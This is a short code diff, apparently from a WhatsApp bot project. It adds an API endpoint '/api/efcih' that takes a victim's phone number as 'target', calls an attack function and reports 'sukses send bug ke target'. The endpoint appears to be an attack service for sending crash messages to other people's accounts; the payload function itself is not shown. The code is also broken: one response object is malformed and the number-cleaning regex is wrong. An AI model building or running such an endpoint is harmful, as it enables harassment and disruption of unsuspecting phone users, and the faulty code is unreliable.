@@ -65,3 +65,15 @@ async function koneksi() {
     console.log('Kode Pairing Anda Adalah' + Kode);
   }
 }
+
+app.get("/api/efcih", async(req, res) => {
+  const { nomor } = req.query;
+  if(!nomor)
+  return res.json({"masukkan target anda"});
+  let target = nomor.replace(/^0-9/g, "");
+  await Efcih(target)
+  res.json({
+    status: true,
+    message: `sukses send bug ke ${target}`
+  });
+});
